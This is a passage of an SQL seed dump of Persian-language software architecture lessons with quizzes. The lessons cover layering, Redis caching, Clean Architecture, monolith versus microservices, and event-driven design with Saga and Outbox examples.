SQL/Query","HTTP، قوانین قیمت‌گذاری"],["Model","ساختار داده و اینورینت‌هایش (Invariants)","هیچ‌کدام — خالص‌ترین لایه"]]},{"k":"warn","title":"دام رایج","t":"لایه‌بندی نمایشی: فایل‌ها در پوشه‌های جدا، ولی Service پر از query و Handler پر از if/else منطق. لایه واقعی را از importها می‌شناسی، نه از نام پوشه‌ها — اگر service.py خطی از flask وارد کرده، لایه‌ای در کار نیست."},{"k":"tip","title":"نکته حرفه‌ای","t":"قانون عملی برای شروع: «تابع‌های Service هیچ آرگومان و خروجی HTTP‌ای ندارند — فقط dict و مدل.» همین یک ممنوعیت ساده، ۸۰٪ نشت لایه‌ها را حذف می‌کند و کد را قابل‌تست می‌کند."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["معماری یعنی مدیریت جهت وابستگی: Handler → Service → Repository، هرگز برعکس.","SQL فقط در Repository؛ منطق فقط در Service؛ پروتکل فقط در Handler.","تستِ سریعِ منطق و تعویض‌پذیریِ دیتابیس، پاداش این انضباط است."]}]'::jsonb, '[{"q":"کجا تنها جای مجاز برای SQL است؟","opts":["Service","Handler","Repository — چون مرز داده است و بقیه لایه‌ها باید از آن بی‌خبر باشند","هرجا سریع‌تر باشد"],"ans":2,"why":"وقتی SQL در یک لایه محبوس باشد، Service بدون دیتابیس تست می‌شود و تعویض دیتابیس یک‌جاست؛ پخش‌شدنش یعنی بازنویسی."},{"q":"مزیت واقعی Interface بین Service و Repository چیست؟","opts":["کد کوتاه‌تر","تست منطق با دیتابیس جعلی و تعویض دیتابیس بدون تغییر منطق","سرعت بیشتر","الزام فریم‌ورک"],"ans":1,"why":"این Interface مرزی است که «منطق» را از «ذخیره‌سازی» جدا می‌کند؛ بدون آن، هر تست نیاز به دیتابیس واقعی دارد."},{"q":"خطای دیتابیس نباید تا کاربر برسد؛ چرا؟","opts":["زیبا نیست","نشت انتزاع است: هم امنیت (لو رفتن جزئیات داخلی) هم تجربه کاربری را خراب می‌کند؛ باید در لایه‌ها ترجمه شود","مهم نیست","مرورگر نمی‌فهمد"],"ans":1,"why":"پیام «connection refused» به کاربر، هم ساختار داخلی را لو می‌دهد هم هیچ کمکی به او نمی‌کند؛ لایه Handler باید آن را به ۵۰۳ با پیام مناسب ترجمه کند."}]'::jsonb),
('arch-r2', 'arch', 'کش و مقیاس‌پذیری: وقتی یک سرور کافی نیست', 60, 2, '[{"k":"p","t":"هر سیستمی بالاخره به دیواری می‌خورد: CPU صددرصد، دیتابیس کند، پاسخ‌ها ۱۰ ثانیه‌ای. مقیاس‌پذیری یعنی هنر رشد سیستم بدون بازنویسی — و اولین و ارزان‌ترین ابزارش «کش» است: پاسخ‌های تکراری را یک‌بار حساب کن و هزار بار تحویل بده. ولی کش، مثل هر سلاح قدرتمندی، اگر کور استفاده شود، خودش باگ می‌سازد."},{"k":"h","t":"کش در کجاها؟"},{"k":"p","t":"کش فقط Redis نیست؛ یک طیف است: کش مرورگر (Cache-Control برای تصاویر و CSS)، CDN (نسخه‌های استاتیک در ۲۰۰ شهر دنیا)، کش اپلیکیشن (Redis برای جواب queryهای پرتکرار)، و حتی کش دیتابیس (buffer pool خود PostgreSQL). قانون ۸۰/۲۰: معمولاً ۲۰٪ داده، ۸۰٪ درخواست‌ها را می‌سازد — همان ۲۰٪ را کش کن و ۹۰٪ بار از دوش دیتابیس برداشته می‌شود. قبل از کش، اول queryها را ایندکس کن — کش روی query بد، فقط باگ را سریع‌تر تحویل می‌دهد."},{"k":"h","t":"سخت‌ترین مسئله علوم کامپیوتر"},{"k":"p","t":"به قول معروف، فقط دو چیز در علوم کامپیوتر سخت است: بی‌اعتبارکردن کش و نام‌گذاری. وقتی داده تغییر کرد، کپی کش‌شده‌اش باید باطل شود — و اگر فراموش کنی، کاربر داده کهنه می‌بیند (باگی که فقط گاهی رخ می‌دهد و بدترین نوع است). سه راهبرد اصلی: TTL (عمر کوتاه و پذیرش کهنگی موقت)، باطل‌کردن هنگام نوشتن (write-invalidate: هر UPDATE، کلید کش را پاک کند)، و Event-Driven (سیستم رویداد بفرستد و کش‌ها گوش کنند). برای بیشتر محصولات، TTL کوتاه + باطل‌کردن هنگام نوشتن کافی و ساده است."},{"k":"h","t":"مقیاس عمودی در برابر افقی"},{"k":"p","t":"عمودی یعنی سرور بزرگ‌تر (CPU و RAM بیشتر) — ساده، ولی سقف دارد و نقطه شکست واحد است. افقی یعنی سرورهای بیشتر — بی‌نهایت رشد می‌کند، ولی سه چیز می‌خواهد: Load Balancer برای پخش ترافیک، Session خارج از سرور (در Redis یا JWT) تا هر سروری هر کاربری را قبول کند، و دیتابیس مشترک یا تقسیم‌شده. قاعده صنعت: اول تا جای ممکن عمودی و با یک اپ State-less؛ مقیاس افقی را وقتی شروع کن که واقعاً لازم شده — چون پیچیدگی‌اش واقعی است."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"py","title":"cache_pattern.py","code":"import redis, json\nr = redis.Redis()\n\ndef get_product(pid: int):\n    key = f\"product:{pid}\"\n    cached = r.get(key)\n    if cached is not None:\n        return json.loads(cached)        # ← مسیر گرم: میلی‌ثانیه\n\n    product = db.query(\"SELECT * FROM products WHERE id = %s\", pid)\n    r.setex(key, 60, json.dumps(product))  # TTL: فقط ۶۰ ثانیه\n    return product\n\ndef update_product(pid: int, data):\n    db.execute(\"UPDATE products ...\", data)\n    r.delete(f\"product:{pid}\")           # write-invalidate:\n                                         # خواندن بعدی، نسخه تازه می‌سازد"},{"k":"list","items":["خواندن: اول کش، بعد دیتابیس — و نتیجه در کش با عمر ۶۰ ثانیه.","نوشتن: بعد از UPDATE، کلید کش پاک می‌شود؛ درخواست بعدی نسخه تازه را از دیتابیس می‌سازد.","TTL کوتاه یعنی حتی اگر delete فراموش شود، کهنگی حداکثر یک دقیقه است — باگ محدود شده.","این الگوی Cache-Aside رایج‌ترین الگوی کش دنیاست؛ ساده، قابل‌فهم و قابل‌اتکا."]},{"k":"def","term":"Thundering Herd","t":"وقتی یک کلید کشِ داغ منقضی می‌شود و همزمان هزار درخواست به دیتابیس هجوم می‌برند تا دوباره بسازندش — دقیقاً لحظه‌ای که سیستم زیر فشار است. درمان: فقط یک درخواست (با قفل توزیع‌شده) بازسازی کند و بقیه چند میلی‌ثانیه صبر کنند، یا داده را قبل از انقضا در پس‌زمینه تازه کن."},{"k":"table","head":["لایه کش","چی را","کهنگی قابل‌قبول"],"rows":[["مرورگر / CDN","تصاویر، CSS، JS","ساعت تا روز"],["Redis اپلیکیشن","جواب queryهای پرتکرار","ثانیه تا دقیقه"],["Buffer دیتابیس","صفحه‌های داغ جدول","خودکار"],["کش محلی (در RAM خود سرویس)","ثابت‌های پرمصرف","تا ری‌استارت"]]},{"k":"warn","title":"دام رایج","t":"کش‌کردن «همه‌چیز» از روز اول: هر کلید کش، یک باگ بالقوه کهنگی است. فقط داده‌ای را کش کن که هم پرتکرار است و هم کهنگی چندثانیه‌ای‌اش بی‌ضرر — موجودی حساب و قیمت لحظه‌ای از جنس کش نیستند."},{"k":"tip","title":"نکته حرفه‌ای","t":"قبل از هر بهینه‌سازی، گلوگاه را اندازه بگیر (نه حدس بزن): اگر ۸۰٪ زمان در یک query است، اول ایندکس؛ اگر همان query هزار بار در ثانیه تکرار می‌شود، بعد کش. ترتیبِ «اندازه بگیر → ایندکس → کش → مقیاس افقی» هزاران ساعت بازنویسی را نجات داده است."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["کش یعنی پاسخ تکراری را دوباره حساب نکن؛ اول ایندکس، بعد کش.","باطل‌کردن کش مهم‌تر از ساختن آن است: TTL کوتاه + پاک‌کردن هنگام نوشتن.","مقیاس افقی پادشاه است، ولی State-lessبودن و Load Balancer پیش‌نیازش."]}]'::jsonb, '[{"q":"الگوی Cache-Aside هنگام نوشتن چه می‌کند؟","opts":["کش را به‌روز می‌کند","کلید کش را پاک می‌کند تا خواندن بعدی نسخه تازه بسازد","کش را نادیده می‌گیرد","همه کش را خالی می‌کند"],"ans":1,"why":"پاک‌کردن ساده‌تر و امن‌تر از به‌روزرسانی است؛ به‌روزرسانی در شرایط همزمانی می‌تواند داده کهنه را روی تازه بنویسد."},{"q":"چرا قبل از مقیاس افقی، اپلیکیشن باید State-less باشد؟","opts":["سریع‌تر می‌شود","چون Load Balancer هر درخواست را ممکن است به هر سروری بفرستد؛ اگر Session در RAM یک سرور باشد، کاربر گم می‌شود","قانون است","RAM گران است"],"ans":1,"why":"وقتی وضعیت کاربر در Redis یا JWT باشد، هر سروری می‌تواند هر درخواستی را جواب بدهد — وگرنه مقیاس افقی عملاً کار نمی‌کند."},{"q":"کدام داده برای کش ۶۰ ثانیه‌ای مناسب نیست؟","opts":["لیست محصولات پرفروش","موجودی لحظه‌ای حساب بانکی","پروفایل عمومی کاربر","تنظیمات سایت"],"ans":1,"why":"کهنگی ۶۰ ثانیه برای موجودی حساب یعنی تراکنش روی عدد اشتباه — داده‌های مالی یا باید بدون کش باشند یا با باطل‌کردن همزمان."}]'::jsonb),
('c12-l1', 'arch', 'لایه‌بندی و Clean Architecture', 60, 3, '[{"k":"p","t":"معماری یعنی تصمیم درباره «چه چیزی اجازه دارد به چه چیزی وابسته باشد». در Clean Architecture وابستگی‌ها فقط به سمت داخل مجازند: فریم‌ورک‌ها و دیتابیس در بیرونی‌ترین لایه و قوانین کسب‌وکار در مرکز. نتیجه: تعویض دیتابیس یا فریم‌ورک بدون دست‌زدن به منطق اصلی."},{"k":"code","lang":"txt","title":"structure","code":"src/\n├── domain/            # قلب سیستم — بدون هیچ وابستگی\n│   ├── entities/      # User, Order, Product\n│   ├── services/      # قوانین کسب‌وکار خالص\n│   └── ports/         # interfaceها (OrderRepository)\n├── application/       # use caseها (PlaceOrderUseCase)\n├── adapters/          # ترجمه دنیای بیرون به domain\n│   ├── web/           # controllerها و routeها\n│   ├── persistence/   # پیاده‌سازی repository با SQL\n│   └── messaging/     # producer/consumer\n└── infra/             # config، bootstrap، DI"},{"k":"visual","visual":"microvmono","title":"شبیه‌ساز: سبک‌های معماری"},{"k":"def","term":"Port و Adapter","t":"domain نیازهایش را به‌صورت interface (Port) اعلام می‌کند — مثلاً «یک OrderRepository می‌خواهم». Adapter پیاده‌سازی واقعی است (PostgresOrderRepository). domain نمی‌داند و نباید بداند پشت صحنه چه دیتابیسی است."},{"k":"code","lang":"ts","title":"ports.ts","code":"// domain/ports/order-repository.ts\nexport interface OrderRepository {\n    findById(id: string): Promise<Order | null>;\n    save(order: Order): Promise<void>;\n}\n\n// application/place-order.ts — فقط به port وابسته است\nexport class PlaceOrder {\n    constructor(private orders: OrderRepository) {}\n\n    async run(userId: string, items: CartItem[]): Promise<Order> {\n        const order = Order.create(userId, items);\n        await this.orders.save(order);\n        return order;\n    }\n}"},{"k":"warn","title":"معماری برای بعداً","t":"Clean Architecture برای سیستم‌هایی است که رشد می‌کنند و تیم‌ها تغییر می‌کنند. برای یک MVP دو هفته‌ای، این لایه‌ها سرعت را می‌کشند. قانون: وقتی دردِ تغییر حس شد، جدا کن — نه قبل از آن."},{"k":"tip","title":"نکته منتور","t":"ساده‌ترین تست معماری: اگر بتوانی use caseها را بدون دیتابیس، بدون HTTP و بدون فریم‌ورک تست کنی، مرزها درست کشیده شده‌اند."},{"k":"h","t":"عمیق‌تر: ویژگی‌های کیفی — زبان مشترک بحث معماری"},{"k":"p","t":"وقتی کسی می‌گوید «سیستم باید خوب باشد»، یعنی هیچ. معماری یعنی ترجمه «خوب» به ویژگی‌های کیفی قابل‌سنجش: دسترس‌پذیری (چند درصدِ زمان پاسخ می‌دهد — 99.9 یعنی حدود ۹ ساعت توقف در سال)، مقیاس‌پذیری (وقتی بار ده برابر شد چه می‌شود)، تأخیر (درصد ۹۹ام چند میلی‌ثانیه است)، امنیت و قابلیت نگهداری. نکته مهم: این ویژگی‌ها با هم رقابت دارند — دسترس‌پذیری بیشتر معمولاً یعنی تکرار بیشتر و پیچیدگی بیشتر؛ سازگاری قوی‌تر یعنی تأخیر بیشتر. معماری یعنی انتخاب آگاهانه این مصالحه‌ها برای این محصولِ خاص، و ثبت‌کردنشان."},{"k":"p","t":"و چون این تصمیم‌ها ماه‌ها بعد فراموش می‌شوند، تیم‌های حرفه‌ای آن‌ها را در ADR (سند تصمیم معماری) ثبت می‌کنند: یک صفحه کوتاه با چهار بخش — زمینه (چه مسئله‌ای بود)، تصمیم (چه کردیم)، جایگزین‌ها (چه گزینه‌های دیگری داشتیم و چرا رد شدند) و پیامدها (چه هزینه‌ای پذیرفتیم). ADR جلوی بحث‌های تکراری «چرا این‌طوری است؟» را می‌گیرد و به نفر بعدی نشان می‌دهد که آن تصمیم از روی نادانی نبوده — و اگر شرایط عوض شد، دقیقاً می‌داند کدام فرض را باید دوباره بررسی کند."},{"k":"code","lang":"txt","title":"قالب ADR — یک صفحه، چهار بخش","code":"ADR-0012: استفاده از صف پیام برای سفارش‌ها\n\nزمینه: ثبت سفارش همزمان باید موجودی، پرداخت و\nاطلاع‌رسانی را هماهنگ کند؛ فراخوانی همزمانِ سه سرویس،\nتأخیر را سه برابر و خرابی هر کدام را به کاربر منتقل می‌کرد.\n\nتصمیم: سفارش در صف پیام گذاشته می‌شود و هر سرویس\nمستقل مصرف می‌کند (سازگاری نهایتی).\n\nجایگزین‌ها: فراخوانی همزمان (ساده ولی شکننده)؛\nتراکنش دوفازی (قوی ولی کند و پیچیده).\n\nپیامدها: کاربر لحظه‌هایی وضعیت «در حال پردازش» می‌بیند؛\nدر عوض خرابی یک سرویس، بقیه را متوقف نمی‌کند."}]'::jsonb, '[{"q":"در Clean Architecture وابستگی‌ها به کدام سمت مجازند؟","opts":["به سمت بیرون (فریم‌ورک‌ها)","به سمت داخل (domain)","دوطرفه","بستگی به اندازه پروژه دارد"],"ans":1,"why":"مرکز (قوانین کسب‌وکار) باید از همه‌چیز مستقل بماند؛ دیتابیس و فریم‌ورک به آن وابسته‌اند نه برعکس."},{"q":"مزیت Port/Adapter چیست؟","opts":["کد کمتر","تعویض پیاده‌سازی (مثل دیتابیس) بدون تغییر منطق","سرعت بیشتر query","حذف نیاز به تست"],"ans":1,"why":"منطق به interface وابسته است؛ برای تست Fake و برای تولید Postgres — هر دو بدون تغییر یک خط از domain."}]'::jsonb),
('c12-l2', 'arch', 'Monolith یا Microservices؟', 65, 4, '[{"k":"p","t":"میکروسرویس مد شده، اما اکثر تیم‌هایی که زود شکسته‌اند، پشیمان‌اند. حقیقت: Monolith خوب‌ساخته (Modular Monolith) برای ۹۰٪ محصولات تا سال‌ها کافی است. میکروسرویس هزینه دارد: شبکه غیرقابل‌اعتماد، توزیع داده، استقرار پیچیده و Observability."},{"k":"table","head":["معیار","Modular Monolith","Microservices"],"rows":[["استقرار","ساده — یک artifact","چندین pipeline و نسخه‌بندی"],["ارتباط","فراخوانی تابع — سریع و مطمئن","شبکه — کند و خطاپذیر"],["تراکنش","ACID ساده","Saga — پیچیده و eventually consistent"],["تیم","مناسب تیم کوچک","تیم‌های مستقل و بزرگ"],["مقیاس","کل سیستم با هم","مقیاس مستقل هر بخش"]]},{"k":"def","term":"Bounded Context","t":"مرزی از DDD که داخلش یک مدل معنایی یکپارچه حاکم است؛ مثلاً «کالا» در context انبار یعنی موجودی و وزن، در context فروش یعنی قیمت و توضیح. مرزهای سرویس باید با این contextها منطبق شوند نه با جدول‌های دیتابیس."},{"k":"warn","title":"قانون شکستن","t":"تا وقتی درد واقعی نداری نشکن: دردی مثل استقرار کندِ ناشی از اندازه، تیم‌هایی که روی کد هم پا می‌گذارند، یا نیاز مقیاس مستقل یک بخش. «پیش‌بینی رشد آینده» به‌تنهایی دلیل موجهی نیست."},{"k":"tip","title":"نکته منتور","t":"Modular Monolith یعنی همان معماری لایه‌ای با مرزهای سفت: هر ماژول فقط از طریق interface عمومی ماژول دیگر را می‌شاید. اگر روزی شکستن لازم شد، مرزها از قبل آماده‌اند."},{"k":"h","t":"عمیق‌تر: مرزها قبل از پروتکل‌ها"},{"k":"p","t":"رایج‌ترین اشتباه در طراحی میکروسرویس، شروع با تکنولوژی است: «کافکا بزنیم یا RabbitMQ؟» در حالی که سوال اول جای دیگری است: «مرز سرویس‌ها کجاست؟». مرز درست تقریباً همیشه با مرزهای کسب‌وکاری هم‌راستاست: سفارش، موجودی، پرداخت، کاربران — نه با لایه‌های فنی (سرویس دیتابیس، سرویس کش). معیار عملی: اگر دو بخش معمولاً با هم تغییر می‌کنند و توسط یک تیم نگه داشته می‌شوند، احتمالاً باید یک سرویس باشند؛ و اگر تغییراتشان مستقل است و داده‌شان کم‌اشتراک، کاندید جدایی‌اند."},{"k":"p","t":"و یک قاعده طلایی که جلوی نیمی از شکست‌های میکروسرویسی را می‌گیرد: تا وقتی مجبور نشدی، تقسیم نکن. یک مونولیتِ ماژولار با مرزهای داخلی تمیز، برای ۹۰٪ تیم‌ها تا سال‌ها کافی است — و وقتی واقعاً نیاز به مقیاس‌دهی مستقل پیدا کردی، همان مرزهای داخلی می‌شوند محل برشِ سرویس‌ها. تقسیم زودرس یعنی توزیع‌کردنِ پیچیدگی روی مسئله‌ای که هنوز نمی‌شناسی؛ و بازگرداندنِ چندین سرویس به هم، چندین برابر سخت‌تر از جداکردنِ یک ماژول است."}]'::jsonb, '[{"q":"بزرگ‌ترین هزینه پنهان میکروسرویس چیست؟","opts":["لایسنس","انتقال ارتباط درون‌پردازشی به شبکه‌ای غیرقابل‌اعتماد","نیاز به RAM بیشتر","کند بودن زبان‌ها"],"ans":1,"why":"فراخوانی که دیروز یک تابع بود حالا درخواست شبکه است: Timeout، Retry، نسخه‌بندی و خطای جزئی — پیچیدگی‌ای که در Monolith اصلاً وجود نداشت."},{"q":"مرز مناسب برای شکستن به سرویس چیست؟","opts":["تعداد خطوط کد","Bounded Context و نیاز مستقل تیم/مقیاس","تعداد endpointها","تصمیم مدیر فنی"],"ans":1,"why":"مرزهای معنایی کسب‌وکار پایدارند؛ مرز بر اساس جدول یا endpoint با اولین تغییر نیازمندی جابه‌جا می‌شود و شکست‌ها شروع می‌شود."}]'::jsonb),
('c12-l3', 'arch', 'ارتباط سرویس‌ها و Event-Driven', 70, 5, '[{"k":"p","t":"سرویس‌ها دو جور حرف می‌زنند: همگام (REST/gRPC — «الان جواب بده») و ناهمگام (پیام — «هر وقت رسیدی انجام بده»). ارتباط همگام زنجیره وابستگی می‌سازد؛ اگر سرویس پایین‌دست بیفتد، بالادست هم می‌افتد. Message Broker این وابستگی را می‌شکند."},{"k":"code","lang":"js","title":"producer.js","code":"// سرویس سفارش: فقط اعلام می‌کند چه اتفاقی افتاد\nconst { Kafka } = require(\"kafkajs\");\nconst kafka = new Kafka({ brokers: [\"kafka:9092\"] });\nconst producer = kafka.producer();\n\nasync function placeOrder(order) {\n    await orders.save(order);\n\n    await producer.send({\n        topic: \"order.placed\",\n        messages: [{\n            key: order.id,\n            value: JSON.stringify({\n                orderId: order.id,\n                userId: order.userId,\n                items: order.items,\n            }),\n        }],\n    });\n    // سرویس سفارش نمی‌داند چه کسی گوش می‌دهد:\n    // انبار موجودی کم می‌کند، ایمیل تأیید می‌رود، وفاداری امتیاز می‌دهد\n}"},{"k":"def","term":"Event","t":"گزارش تغییری که قبلاً رخ داده — گذشته‌نگر و تغییرناپذیر: order.placed نه order.place. مصرف‌کننده‌ها می‌توانند بعداً اضافه شوند بدون اینکه تولیدکننده تغییر کند؛ همین «جهل متقابل» قدرت معماری رویدادمحور است."},{"k":"h","t":"وقتی تراکنش ACID ممکن نیست"},{"k":"p","t":"در سیستم توزیع‌شده نمی‌شود در یک تراکنش هم سفارش را ثبت کرد هم موجودی را کم کرد؛ چون دو دیتابیس جداست. راه‌حل Saga: هر قدم یک تراکنش محلی + یک Event؛ و اگر قدمی شکست، Eventهای جبرانی (Compensation) مراحل قبل را برمی‌گردانند."},{"k":"warn","title":"Event هم رایگان نیست","t":"معماری رویدادمحور یعنی پذیرش Eventually Consistency: برای لحظاتی سفارش ثبت شده ولی موجودی هنوز کم نشده. اگر کسب‌وکار این تأخیر را تحمل نمی‌کند، همان فراخوانی همگام با مدارشکن (Circuit Breaker) انتخاب درست‌تری است."},{"k":"h","t":"عمیق‌تر: الگوی Outbox و مشکل «دو نوشتن»"},{"k":"p","t":"در معماری رویدادمحور، باگی هست که همه بالاخره می‌خورند: سرویس سفارش، داده را در دیتابیس ذخیره می‌کند و بعد رویداد را به Kafka می‌فرستد — اگر بین این دو قدم کرش کند، یا سفارش هست و رویداد نیست (موجودی هیچ‌وقت کم نمی‌شود) یا برعکس. این «مشکل دو نوشتن» است: دو سیستم ذخیره، یک تراکنش غیرممکن. راه‌حل کلاسیک، الگوی Outbox است: رویداد را به‌عنوان یک ردیف، داخل همان تراکنش دیتابیس ذخیره کن (جدول outbox) و یک فرستنده جدا، رویدادها را از outbox به Kafka ببرد و بعد پاک کند. حالا فقط یک نوشتن اتمیک داری؛ فرستنده هم چون Idempotent است، تکرار ارسال بی‌ضرر است."},{"k":"p","t":"و چون تکرار پیام در دنیای واقعی اجتناب‌ناپذیر است (شبکه قطع می‌شود، مصرف‌کننده قبل از ACK می‌میرد)، هر مصرف‌کننده باید Idempotent باشد: پردازش دوباره یک پیام، نتیجه را دو برابر نکند. دو تکنیک رایج: نگه‌داشتن شناسه پیام‌های پردازش‌شده (و ردکردن تکراری‌ها) یا طبیعی‌کردن عملیات (SET status=''paid'' ذاتاً تکرارپذیر است، ولی balance += 100 نیست — باید بشود SET balance = 250). قانون کلی: همه عملیات‌هایت را یا ذاتاً Idempotent طراحی کن یا با کلید Idempotency مجهزشان کن؛ در سیستم توزیع‌شده، «دقیقاً یک بار» افسانه است و «حداقل یک بار + مصرف‌کننده Idempotent» مهندسی است."},{"k":"code","lang":"sql","title":"outbox-pattern.sql","code":"-- در همان تراکنشِ ثبت سفارش:\nBEGIN;\n\nINSERT INTO orders (id, customer_id, total)\nVALUES (''ord-42'', ''cus-7'', 350000);\n\nINSERT INTO outbox (event_id, topic, payload, created_at)\nVALUES (''evt-901'', ''orders'',\n        ''{\"type\":\"OrderPlaced\",\"order_id\":\"ord-42\"}'', now());\n\nCOMMIT;   -- یا هر دو هستند یا هیچ‌کدام ✓\n\n-- فرستنده (Relay) — هر چند ثانیه:\n-- 1) ردیف‌های outbox را می‌خواند و به Kafka می‌فرستد\n-- 2) بعد از ACK، پاک می‌کند\n-- 3) اگر وسطش بمیرد، دفعه بعد دوباره می‌فرستد —\n--    مصرف‌کننده Idempotent تکرار را بی‌اثر می‌کند.\n\n-- سمت مصرف‌کننده: Idempotency طبیعی\nUPDATE orders SET status = ''paid''      -- تکرارش بی‌ضرر است\nWHERE id = ''ord-42'' AND status <> ''paid'';"},{"k":"table","head":["الگو","مسئله‌اش چیست","کی استفاده کنیم"],"rows":[["Request/Response سینک","وابستگی لحظه‌ای؛ کندترین سرویس، سرعت کل","کوئری‌ها و خواندن‌ها"],["رویداد + صف","همگام‌سازی دیررس؛ پیچیدگی ردیابی","نوشتن‌ها و اعلان‌ها"],["Saga (هماهنگی)","تراکنش بین چند سرویس","فرایندهای بلند مثل رزرو"],["Outbox","اتمیته بین دیتابیس و صف","هر انتشار رویداد — تقریباً همیشه"]]},{"k":"tip","title":"نکته منتور","t":"برای درک واقعی Saga، یک بار روی کاغذ سناریوی «رزرو پرواز + هتل + ماشین» را بکش: مسیر شاد، و بعد خرابی در هر مرحله — چه جبران‌کننده‌ای لازم است و ترتیبش چیست؟ (ماشین لغو می‌شود، بعد هتل، بعد پرواز — معکوسِ انجام). این تمرین ۲۰ دقیقه‌ای، بیشتر از هر مقاله‌ای معماری توزیع‌شده را جا می‌اندازد."}]'::jsonb, '[{"q":"مهم‌ترین مزیت Message Broker بین دو سرویس چیست؟","opts":["سرعت بیشتر درخواست","قطع وابستگی همگام؛ خرابی مصرف‌کننده تولیدکننده را نمی‌خواباند","امنیت بیشتر","کاهش حجم داده"],"ans":1,"why":"تولیدکننده پیام را به Broker می‌سپارد و برمی‌گردد؛ مصرف‌کننده هر وقت آماده بود پردازش می‌کند — خرابی‌ها و ترافیک‌ها جدا می‌شوند."},{"q":"الگوی Saga چه مسئله‌ای را حل می‌کند؟","opts":["سرعت query","تراکنش چندسرویسی بدون قفل سراسری","احراز هویت","نسخه‌بندی API"],"ans":1,"why":"به‌جای یک تراکنش توزیع‌شده غیرممکن، زنجیره‌ای از تراکنش‌های محلی با Event و مسیر جبران برای شکست تعریف می‌شود."}]'::jsonb)
